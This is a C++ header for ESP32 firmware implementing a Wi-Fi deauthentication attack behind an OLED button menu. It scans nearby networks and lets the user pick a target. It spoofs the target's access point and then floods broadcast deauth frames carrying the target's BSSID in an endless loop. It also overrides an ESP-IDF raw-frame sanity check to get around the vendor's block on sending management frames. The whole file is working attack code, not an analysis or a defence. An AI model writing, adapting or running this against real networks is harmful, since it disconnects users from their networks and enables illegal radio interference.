#ifndef WIFI_DEAUTHER_H
#define WIFI_DEAUTHER_H

#include "esp_wifi.h"
#include "esp_system.h"
#include <WiFi.h>
#include <Arduino.h>
#include <Adafruit_SSD1306.h>
#include <GyverButton.h>

#include "menu_icons.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337)
    return 1;
  else
    return 0;
}

// Default Drauth Frame
const uint8_t deauth_frame_default[] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x02, 0x00
};

uint8_t deauth_frame[sizeof(deauth_frame_default)];

// Переменные меню
bool wifi_menu_active = true;
int8_t wifi_pointer = 0;  // Указатель на пункт меню

// Структура для хранения информации о Wi-Fi сети
struct WifiNetwork {
  String ssid;
  String bssid_str;
  int rssi;  // Уровень сигнала
  int encryptionType;
  int channel;
  uint8_t bssid[6];
};

#define MAX_NETWORKS 20

WifiNetwork networks[MAX_NETWORKS];  // Массив сетей

int networkCount = 0;                // Количество обнаруженных сетей
int8_t selectedNetwork = 0;          // Указатель на выбранную сеть

extern Adafruit_SSD1306 oled;  // Экстерн для доступа к дисплею
extern GButton ok;             // Экстерн для кнопки ok

bool deauther_app_run = true;

// Прототипы функций
void displayWifiMenu(MenuItem wifiMenu[], int menuSize, int8_t& pointer);
void handleWifiMenuNavigation(MenuItem wifiMenu[], int menuSize, int8_t& pointer);
void executeWifiMenuAction();
void drawWifiPointer(uint8_t pointer);
void scanNetworks();  // Функция для сканирования сетей

void wsl_bypasser_send_raw_frame(WifiNetwork network, uint8_t chan);
void send_raw_frame(const uint8_t* frame_buffer, int size);

void displayNetworkMenu(int8_t& pointer);
void handleNetworkMenuNavigation(int8_t& pointer);
void deauthNetwork(WifiNetwork network);
void wifi_deauth_menu();

void exit_wifi();
void wifiInit();
void wifi_app();
void wifiDisconnect();

// Создаем массив пунктов меню с пиктограммами
MenuItem wifiMenu[] = {
  { "Deauth", scanNetworks, deauth_icon },
  { "Back", exit_wifi, back_icon }
};

#define MAIN_WIFI_MENU_SIZE (sizeof(wifiMenu) / sizeof(wifiMenu[0]))

bool wifi_app_run = true;

void wifi_app() {
  wifi_app_run = true;
  int8_t pointer = 0;  // Переменная указатель на элемент меню

  while (wifi_app_run) {
    ok.tick();
    displayWifiMenu(wifiMenu, MAIN_WIFI_MENU_SIZE, pointer);
    handleWifiMenuNavigation(wifiMenu, MAIN_WIFI_MENU_SIZE, pointer);
  }
}

// Функция для отображения меню
void displayWifiMenu(MenuItem wifiMenu[], int menuSize, int8_t& pointer) {
  oled.clearDisplay();

  const int itemHeight = 16;  // Высота каждого элемента
  const int iconSize = 8;     // Размер пиктограммы (8x8)
  const int boxWidth = 120;   // Ширина рамки
  const int boxHeight = itemHeight;
  const int boxX = 4;
  const int radius = 4;
  const int visibleItems = 3;
  int firstVisibleItem = pointer - pointer % visibleItems;

  for (int i = 0; i < visibleItems; i++) {
    int menuIndex = firstVisibleItem + i;
    if (menuIndex >= menuSize) break;
    // Рисуем рамку вокруг выбранного пункта
    if (menuIndex == pointer) {
      oled.drawRoundRect(boxX, i * itemHeight, boxWidth, boxHeight, radius, SSD1306_WHITE);
    }

    // Проверяем наличие пиктограммы и отображаем её
    if (wifiMenu[menuIndex].icon != nullptr) {
      int iconX = 8;
      int iconY = i * itemHeight + (itemHeight - iconSize) / 2;
      oled.drawBitmap(iconX, iconY, wifiMenu[menuIndex].icon, iconSize, iconSize, SSD1306_WHITE);
      oled.setCursor(iconX + iconSize + 4, iconY + 1);
    } else {
      oled.setCursor(boxX + 4, i * itemHeight + 4);
    }

    oled.println(wifiMenu[menuIndex].name);
  }

  oled.display();  // Обновление дисплея
}

// Функция для обработки навигации
void handleWifiMenuNavigation(MenuItem wifiMenu[], int menuSize, int8_t& pointer) {
  if (ok.isClick()) {
    pointer++;
    if (pointer >= menuSize) {
      pointer = 0;  // Возврат к первому элементу
    }
  }

  if (ok.isHolded()) {
    wifiMenu[pointer].action();  // Выполнение действия
  }
}

// Начальная функция для подготовки дисплея
void wifiInit() {
  wifi_app_run = true;

  oled.clearDisplay();
  oled.setTextSize(1);
  oled.setTextColor(SSD1306_WHITE);
  oled.setCursor(0, 0);
  oled.println("Wi-Fi Deauther");
  oled.display();
}

void displayNetworkMenu(int8_t& pointer) {
  oled.clearDisplay();

  const int itemHeight = 16;  // Height of each item
  const int boxWidth = 120;
  const int boxHeight = itemHeight;
  const int boxX = 4;
  const int radius = 4;
  const int iconSize = 8;  // Size of the icon (8x8)
  const int visibleItems = 3;
  int firstVisibleItem = pointer - pointer % visibleItems;

  for (int i = 0; i < visibleItems; i++) {
    int networkIndex = firstVisibleItem + i;

    if (networkIndex == networkCount) {  // Back button
      if (networkIndex == pointer) {
        oled.drawRoundRect(boxX, i * itemHeight, boxWidth, boxHeight, radius, SSD1306_WHITE);
      }
      oled.setCursor(boxX + 4 + iconSize + 4, i * itemHeight + 4);  // Adjust for icon
      oled.println("Back");
      oled.drawBitmap(boxX + 4, i * itemHeight + 4, back_icon, iconSize, iconSize, SSD1306_WHITE);
    } else if (networkIndex > networkCount) {
      break;  // No more networks
    } else {
      // Draw a rounded rectangle around the selected item
      if (networkIndex == pointer) {
        oled.drawRoundRect(boxX, i * itemHeight, boxWidth, boxHeight, radius, SSD1306_WHITE);
      }

      // Show the network SSID
      oled.setCursor(boxX + 4 + iconSize + 4, i * itemHeight + 4);  // Adjust for icon
      oled.println(networks[networkIndex].ssid);

      // Show the RSSI value
      // oled.setCursor(SCREEN_WIDTH - 24, i * itemHeight + 4);  // Position for RSSI value
      // oled.printf("%d dBm", networks[networkIndex].rssi);

      // Draw Wi-Fi signal strength icon based on RSSI
      int rssi = networks[networkIndex].rssi;
      if (rssi > -60) {
        oled.drawBitmap(boxX + 4, i * itemHeight + 4, wifi_strong_icon, iconSize, iconSize, SSD1306_WHITE);  // Strong signal
      } else if (rssi > -75) {
        oled.drawBitmap(boxX + 4, i * itemHeight + 4, wifi_medium_icon, iconSize, iconSize, SSD1306_WHITE);  // Medium signal
      } else {
        oled.drawBitmap(boxX + 4, i * itemHeight + 4, wifi_weak_icon, iconSize, iconSize, SSD1306_WHITE);  // Weak signal
      }
    }
  }

  oled.display();
}


// Функція для обробки навігації по меню
void handleNetworkMenuNavigation(int8_t& pointer) {
  if (ok.isClick()) {
    pointer++;
    if (pointer > networkCount) {
      pointer = 0;
    }
  }

  if (ok.isHolded()) {
    if (pointer == networkCount) {
      deauther_app_run = false;  // Вихід з програми при довгому натисканні на пункт "Exit"
    } else {
      deauthNetwork(networks[pointer]);  // Вибір мережі та початок деаутентифікації
    }
  }
}


void deauthNetwork(WifiNetwork network) {
  bool app_run = true;

  oled.clearDisplay();
  oled.setTextSize(1);
  oled.setTextColor(SSD1306_WHITE);
  oled.clearDisplay();
  oled.setCursor(0, 0);
  oled.println("Starting...");
  oled.println("AP: " + network.ssid);
  oled.display();

  // Включаем режим точки доступа (AP)
  WiFi.mode(WIFI_AP);
  String emptyString = "";  // Пустая строка для параметра пароля
  String tssid = network.ssid;
  int channel = network.channel;
  // Попытка включить AP на нужном канале
  if (!WiFi.softAP(tssid, emptyString, channel, 1, 4, false)) {
    yield();
  }

  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

  // Отправка кадра raw-frame для начала атаки
  wifi_ap_record_t ap_record;
  wsl_bypasser_send_raw_frame(network, static_cast<uint8_t>(WiFi.channel(network.channel)));

  uint32_t tmp = 0;
  uint32_t count = 0;
  tmp = millis();
  delay(100);

  while (app_run) {
    ok.tick();
    // Отправка кадра для деаутентификации
    send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    count += 3;  // Каждая отправка добавляет 3 кадра

    // Обновление счетчика кадров
    if (millis() - tmp > 2000) {
      oled.clearDisplay();
      oled.setCursor(0, 0);
      oled.println("Target Deauth");
      oled.println("AP: " + network.ssid);
      oled.println("Channel: " + String(network.channel));
      oled.println(network.bssid_str);
      oled.display();
      oled.setCursor(0, 54);
      oled.print("Frames: " + String(count / 2) + "/s");
      oled.display();
      count = 0;
      tmp = millis();
    }
    if (ok.isHolded()) {
      app_run = false;
    }
  }

  wifiDisconnect();
}

// Пример функции отключения Wi-Fi
void wifiDisconnect() {
  WiFi.disconnect();
  WiFi.mode(WIFI_OFF);
}

void scanNetworks() {
  oled.clearDisplay();
  oled.setCursor(0, 0);
  oled.println("Scanning Wi-Fi...");
  oled.display();

  // Запуск сканирования сетей
  int n = WiFi.scanNetworks();
  networkCount = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;  // Ограничиваем количество сетей

  for (int i = 0; i < networkCount; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].encryptionType = WiFi.encryptionType(i);
    networks[i].bssid_str = WiFi.BSSIDstr(i);
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
  }

  Serial.println("Wi-Fi Scan Complete");
  wifi_deauth_menu();  // После сканирования вызываем меню выбора сети
}

void exit_wifi() {
  wifi_app_run = false;
}

void wifi_deauth_menu() {
  int8_t pointer = 0;

  deauther_app_run = true;
  while (deauther_app_run) {
    ok.tick();
    displayNetworkMenu(pointer);
    handleNetworkMenuNavigation(pointer);

    // if (ok.isHolded()) {
    //   while (!ok.isRelease()) {
    //     ok.tick();
    //   }
    //   deauther_app_run = false;
    // }
  }
}

void send_raw_frame(const uint8_t* frame_buffer, int size) {
  esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
  delay(1);
  esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
  delay(1);
  esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
  delay(1);
}

void wsl_bypasser_send_raw_frame(WifiNetwork network, uint8_t chan) {
  Serial.print("\nPreparing deauth frame to -> ");
  for (int j = 0; j < 6; j++) {
    Serial.print(network.bssid[j], HEX);
    if (j < 5)
      Serial.print(":");
  }
  esp_err_t err;
  err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
  if (err != ESP_OK) Serial.println("Error changing channel");
  delay(50);
  memcpy(&deauth_frame[10], network.bssid, 6);
  memcpy(&deauth_frame[16], network.bssid, 6);
}

#endif  // WIFI_DEAUTHER_H
